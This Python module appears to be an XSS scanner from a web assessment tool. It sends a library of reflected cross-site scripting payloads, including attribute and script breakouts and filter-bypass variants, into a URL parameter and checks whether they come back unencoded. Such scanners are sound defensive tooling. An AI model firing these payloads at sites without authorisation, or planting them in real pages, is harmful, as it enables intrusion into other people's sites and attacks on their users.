"""
xss_detector.py — Cross-Site Scripting Detector
================================================
Context-aware XSS detection.  For each payload the detector:
  1. Injects it into the target parameter via GET
  2. Checks whether the payload appears unencoded in the response
  3. Identifies the injection context (HTML body, attribute, script block)
  4. Tries encoding-bypass variants when the baseline is filtered

Layer : Processing Layer
"""

import re
import logging
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

import requests

logger = logging.getLogger("xss_detector")

# ─────────────────────────────────────────────────────────────
# Payload library — grouped by context/technique
# ─────────────────────────────────────────────────────────────

HTML_BODY_PAYLOADS: List[Dict] = [
    {"payload": "<script>alert(1)</script>",              "context": "script_tag"},
    {"payload": "<img src=x onerror=alert(1)>",           "context": "event_handler"},
    {"payload": "<svg onload=alert(1)>",                  "context": "svg"},
    {"payload": "<details open ontoggle=alert(1)>",       "context": "event_handler"},
    {"payload": "<body onload=alert(1)>",                 "context": "event_handler"},
    {"payload": "<input onfocus=alert(1) autofocus>",     "context": "event_handler"},
]

ATTR_BREAK_PAYLOADS: List[Dict] = [
    {"payload": "\" onmouseover=\"alert(1)",              "context": "attr_double_quote"},
    {"payload": "' onmouseover='alert(1)",                "context": "attr_single_quote"},
    {"payload": "\"><script>alert(1)</script>",           "context": "attr_escape"},
    {"payload": "'><script>alert(1)</script>",            "context": "attr_escape"},
    {"payload": "\" autofocus onfocus=\"alert(1)",        "context": "attr_focus"},
]

SCRIPT_BREAK_PAYLOADS: List[Dict] = [
    {"payload": "'-alert(1)-'",                           "context": "script_string"},
    {"payload": "\"-alert(1)-\"",                         "context": "script_string"},
    {"payload": "</script><script>alert(1)</script>",     "context": "script_close"},
    {"payload": "${alert(1)}",                            "context": "template_literal"},
]

BYPASS_PAYLOADS: List[Dict] = [
    {"payload": "<ScRiPt>alert(1)</ScRiPt>",              "context": "case_bypass"},
    {"payload": "<img src=x OnErRoR=alert(1)>",           "context": "case_bypass"},
    {"payload": "<svg/onload=alert(1)>",                  "context": "whitespace_bypass"},
    {"payload": "javascript:alert(1)",                    "context": "protocol_bypass"},
    {"payload": "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;", "context": "html_entity"},
    {"payload": "{{constructor.constructor('alert(1)')()}}", "context": "template_injection"},
]

ALL_PAYLOADS = HTML_BODY_PAYLOADS + ATTR_BREAK_PAYLOADS + SCRIPT_BREAK_PAYLOADS + BYPASS_PAYLOADS

# Patterns that indicate a payload survived unencoded in the response
DANGER_PATTERNS: List[re.Pattern] = [
    re.compile(r"<script[^>]*>.*?alert\s*\(", re.IGNORECASE | re.DOTALL),
    re.compile(r"on\w+\s*=\s*['\"]?alert\s*\(",  re.IGNORECASE),
    re.compile(r"<svg[^>]*onload\s*=",         re.IGNORECASE),
    re.compile(r"javascript\s*:\s*alert",      re.IGNORECASE),
]

# Patterns that indicate the payload was filtered/encoded
ENCODED_INDICATORS = ("&lt;", "&gt;", "&amp;", "&#", "%3C", "%3E")


# ─────────────────────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────────────────────

def _inject_param(url: str, param: str, value: str) -> str:
    parsed    = urlparse(url)
    qs        = parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [value]
    new_query = urlencode(qs, doseq=True)
    return urlunparse(parsed._replace(query=new_query))


def _is_encoded(body: str, payload: str) -> bool:
    """True when the payload appears only in HTML-encoded form."""
    for ind in ENCODED_INDICATORS:
        if ind.lower() in body.lower():
            return True
    return False


def _find_context(body: str, payload: str) -> str:
    """Heuristically locate the injection context in the response body."""
    idx = body.lower().find(payload.lower())
    if idx == -1:
        return "unknown"
    # Grab 200 chars of surrounding context
    snippet = body[max(0, idx - 100): idx + len(payload) + 100]
    if re.search(r"<script", snippet, re.IGNORECASE):
        return "javascript_block"
    if re.search(r'(?:value|href|src|action)\s*=\s*["\']', snippet, re.IGNORECASE):
        return "html_attribute"
    return "html_body"


def _extract_evidence(body: str, payload: str, width: int = 120) -> str:
    idx = body.find(payload)
    if idx == -1:
        idx = body.lower().find(payload.lower())
    if idx == -1:
        return ""
    start = max(0, idx - 30)
    return body[start: start + width]


# ─────────────────────────────────────────────────────────────
# XSSDetector
# ─────────────────────────────────────────────────────────────

class XSSDetector:
    """
    Context-aware cross-site scripting detector.

    Tests reflected XSS across HTML body, attribute, and script
    contexts, plus common filter-bypass variants.

    Parameters
    ----------
    timeout    : per-request HTTP timeout (seconds)
    user_agent : User-Agent header value
    """

    def __init__(
        self,
        timeout:    int = 8,
        user_agent: str = "AegisSecurity/1.0 Web Application Assessment",
    ):
        self.timeout  = timeout
        self._session = requests.Session()
        self._session.headers.update({"User-Agent": user_agent})

    def _get(self, url: str) -> Optional[requests.Response]:
        try:
            return self._session.get(
                url, timeout=self.timeout,
                allow_redirects=True, verify=True
            )
        except requests.exceptions.RequestException:
            return None

    def _test_payload(self, url: str, param: str, item: Dict) -> Optional[Dict]:
        payload     = item["payload"]
        injected    = _inject_param(url, param, payload)
        resp        = self._get(injected)
        if resp is None:
            return None

        body        = resp.text
        reflected   = payload in body or payload.lower() in body.lower()

        if not reflected:
            return None

        # Check whether the reflection is safely encoded
        if _is_encoded(body, payload):
            return None

        # Check for a dangerous pattern (executable form)
        is_executable = any(p.search(body) for p in DANGER_PATTERNS)
        severity      = "high" if is_executable else "medium"
        context       = _find_context(body, payload)
        evidence      = _extract_evidence(body, payload)

        logger.warning(
            "[XSS] param=%s context=%s executable=%s url=%s",
            param, context, is_executable, injected
        )

        return {
            "technique"   : "reflected_xss",
            "payload"     : payload,
            "context"     : item["context"],
            "html_context": context,
            "executable"  : is_executable,
            "evidence"    : evidence,
            "severity"    : severity,
            "injected_url": injected,
            "status_code" : resp.status_code,
        }

    def detect(self, url: str, param: str) -> Dict:
        """
        Run the full XSS payload suite against *url* / *param*.

        Returns
        -------
        dict
            url, param, findings (list), confirmed (bool),
            executable_count, highest_severity
        """
        logger.info("[XSSDetector] Testing %s  param=%s", url, param)

        findings: List[Dict] = []
        seen_contexts: set   = set()

        for item in ALL_PAYLOADS:
            result = self._test_payload(url, param, item)
            if result and result["context"] not in seen_contexts:
                seen_contexts.add(result["context"])
                findings.append(result)

        confirmed = len(findings) > 0
        executable_count = sum(1 for f in findings if f["executable"])

        severities  = [f["severity"] for f in findings]
        highest     = (
            "high"   if "high"   in severities else
            "medium" if "medium" in severities else
            "low"    if severities else "none"
        )

        return {
            "url"             : url,
            "param"           : param,
            "vulnerability"   : "Cross-Site Scripting (XSS)",
            "findings"        : findings,
            "confirmed"       : confirmed,
            "technique_summary": ["reflected_xss"] if confirmed else [],
            "highest_severity": highest,
            "executable_count": executable_count,
            "total_hits"      : len(findings),
        }